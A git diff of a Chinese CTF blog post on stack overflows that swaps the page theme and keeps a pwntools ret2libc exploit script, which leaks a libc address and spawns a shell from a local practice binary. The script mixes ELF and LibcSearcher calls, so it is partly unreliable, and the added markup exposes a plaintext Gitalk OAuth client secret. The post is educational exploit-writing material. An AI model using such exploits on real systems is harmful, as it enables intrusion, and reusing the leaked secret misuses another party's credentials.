@@ -1,178 +1,5 @@
-<!DOCTYPE html>
-<html lang=zh>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="ret2libc，fmtstr">
-<meta property="og:type" content="article">
-<meta property="og:title" content="栈溢出">
-<meta property="og:url" content="http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
-<meta property="og:site_name" content="y1seco&#39;blog">
-<meta property="og:description" content="ret2libc，fmtstr">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20201006145006742.png#pic_center">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170953007.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/14/YauJBxpfHbqmUeX.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/14/YakGtgM3oKCUZc8.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/14/YviIJ6DHCqbA8um.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161018270.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046138.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046265.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933327.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933230.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170934032.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170944869.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171032428.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171033966.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034471.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034134.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171035485.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171044092.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057700.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057722.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200826223512973.png#pic_center">
-<meta property="og:image" content="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171101909.png">
-<meta property="article:published_time" content="2021-11-16T03:46:35.570Z">
-<meta property="article:modified_time" content="2021-11-27T02:40:49.277Z">
-<meta property="article:author" content="y1seco">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201006145006742.png#pic_center">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>栈溢出</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 5.4.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/projects_url">项目</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/2021/11/17/hitcontraining_uaf/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="下一篇" href="/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&text=栈溢出"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&is_video=false&description=栈溢出"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=栈溢出&body=Check out this article: http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&name=栈溢出&description=&lt;p&gt;ret2libc，fmtstr&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/&t=栈溢出"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.</span> <span class="toc-text">一. 基础知识补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ret2text"><span class="toc-number">2.</span> <span class="toc-text">二. ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-ret2libc"><span class="toc-number">3.</span> <span class="toc-text">三. ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">泄露libc利用思路：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A2018-rop"><span class="toc-number">3.2.</span> <span class="toc-text">例题：2018_rop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%9D%83%E9%99%90"><span class="toc-number">4.</span> <span class="toc-text">四.  利用mprotect修改内存权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ROPgadget%E4%BD%BF%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">ROPgadget使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-32%E4%BD%8D%EF%BC%8C64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AF%B9%E6%AF%94"><span class="toc-number">5.</span> <span class="toc-text">五. 32位，64位栈溢出对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-%E8%A6%86%E7%9B%96%E7%9B%B8%E5%85%B3%E5%8F%98%E9%87%8F"><span class="toc-number">6.</span> <span class="toc-text">六. 覆盖相关变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83-BUUCTF-%E4%BE%8B%E9%A2%98"><span class="toc-number">7.</span> <span class="toc-text">七. BUUCTF 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-JarvisOJ-level4"><span class="toc-number">7.1.</span> <span class="toc-text">1. JarvisOJ level4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">7.1.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WP"><span class="toc-number">7.1.2.</span> <span class="toc-text">WP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jarvisoj-level3-x64"><span class="toc-number">7.1.3.</span> <span class="toc-text">jarvisoj_level3_x64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bjdctf-2020-babyrop2"><span class="toc-number">7.1.4.</span> <span class="toc-text">bjdctf_2020_babyrop2</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number"></span> <span class="toc-text">pwn2_sctf_2016</span></a>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        栈溢出
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">y1seco</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2021-11-16T03:46:35.570Z" itemprop="datePublished">2021-11-16</time>
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/pwn/">pwn</a>
-    </div>
-
-
-      
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <p>ret2libc，fmtstr</p>
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>栈溢出 - y1seco&#039;blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="y1seco&#039;blog"><meta name="msapplication-TileImage" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="y1seco&#039;blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="ret2libc，fmtstr"><meta property="og:type" content="blog"><meta property="og:title" content="Y1seco"><meta property="og:url" content="https://removeif.github.io/"><meta property="og:site_name" content="Y1seco"><meta property="og:description" content="ret2libc，fmtstr"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><meta property="article:published_time" content="2021-11-16T03:46:35.570Z"><meta property="article:modified_time" content="2021-11-27T02:40:49.277Z"><meta property="article:author" content="y1seco"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"},"headline":"y1seco'blog","image":["https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170953007.png","https://i.loli.net/2021/10/14/YauJBxpfHbqmUeX.png","https://i.loli.net/2021/10/14/YakGtgM3oKCUZc8.png","https://i.loli.net/2021/10/14/YviIJ6DHCqbA8um.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161018270.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046138.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046265.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933327.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933230.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170934032.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170944869.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171032428.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171033966.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034471.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034134.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171035485.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171044092.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057700.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057722.png","https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171101909.png"],"datePublished":"2021-11-16T03:46:35.570Z","dateModified":"2021-11-27T02:40:49.277Z","author":{"@type":"Person","name":"y1seco"},"description":"ret2libc，fmtstr"}</script><link rel="canonical" href="http://example.com/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"><link rel="icon" href="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/favicon.png"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/logo.png" alt="y1seco&#039;blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/album">Album</a><a class="navbar-item" href="/friend">Friend</a><a class="navbar-item" href="/message">Message</a><a class="navbar-item" href="/self-talking">Self-talking</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-11-16  <a class="commentCountImg" href="/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/#comment-container"><span class="display-none-class">68cab6618bee4c67eaaa346780e0d76a</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="68cab6618bee4c67eaaa346780e0d76a">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>29 分钟  <i class="fas fa-pencil-alt"> </i>4.4 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">栈溢出</h1><div class="content"><p>ret2libc，fmtstr</p>
 <span id="more"></span>
 
 <h2 id="一-基础知识补充"><a href="#一-基础知识补充" class="headerlink" title="一. 基础知识补充"></a>一. 基础知识补充</h2><ol>
@@ -350,143 +177,104 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./test1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *(<span class="number">0xC8</span>+<span class="number">4</span>) + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;read&quot;, read_addr)</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * (<span class="number">0xC8</span>+<span class="number">4</span>) + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+</div><div class="article-licensing box"><div class="licensing-title"><p>栈溢出</p><p><a href="http://example.com/2021/11/16/栈溢出/">http://example.com/2021/11/16/栈溢出/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><a href="http://example.com"><p>y1seco</p></a></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-11-16</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-11-27</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 相关文章</span><br><span>  1.<a class="is-size-6" href="/2021/11/25/unlink/" target="_blank">unlink</a><br></span><span>  2.<a class="is-size-6" href="/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/" target="_blank">babyheap_0ctf_2017</a><br></span><span>  3.<a class="is-size-6" href="/2021/11/11/ROP/" target="_blank">CTF-WIKI-pwn-基本ROP 漏洞复现</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="https://raw.githubusercontent.com/removeif/blog_image/master/img/2019/20190802135456.png" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="https://raw.githubusercontent.com/removeif/blog_image/master/img/2019/20190802135550.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/11/17/hitcontraining_uaf/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">堆漏洞uaf</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"><span class="level-item">babyheap_0ctf_2017</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><div class="card"><div class="card-content"><div class="title is-5">评论</div><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.6.0/gitalk.css"><script> $.getScript('/js/gitalk.min.js', function () { 
+            var gitalk = new Gitalk({
+            language:'zh-CN',
+            id: '68cab6618bee4c67eaaa346780e0d76a',
+            repo: 'blog_comment',
+            owner: 'removeif',
+            clientID: '46a9f3481b46ea0129d8',
+            clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24',
+            admin: ["removeif"],
+            createIssueManually: true,
+            distractionFreeMode: false,
+            perPage: 10,
+            pagerDirection: 'last',
+            proxy: 'https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token',
+            
+            enableHotKey: true,
+            isLocked: false
+        })
+        gitalk.render('comment-container')});</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/./img/avatar1.png" alt="y1seco"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">y1seco</p><p class="is-size-6 is-block">浪漫至死不渝</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/y1seco" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/removeif"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Weibo" href="https://weibo.com/removeif"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:removeif@163.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Next" href="https://removeif.github.io/remove.io"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
+                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
+                                if(data){
+                                    $('#hitokoto').html("");
+                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
+                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
+                                }});}
+                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新评论</h3><span class="body_hot_comment">加载中，最新评论有1分钟缓存...</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-25T01:58:15.556Z">2021-11-25</time></p><p class="title"><a href="/2021/11/25/unlink/">unlink</a></p><p class="categories"><a href="/categories/pwn/">pwn</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-17T12:20:49.949Z">2021-11-17</time></p><p class="title"><a href="/2021/11/17/pwnable_orw/">pwnable orw</a></p><p class="categories"><a href="/categories/pwnable/">pwnable</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time 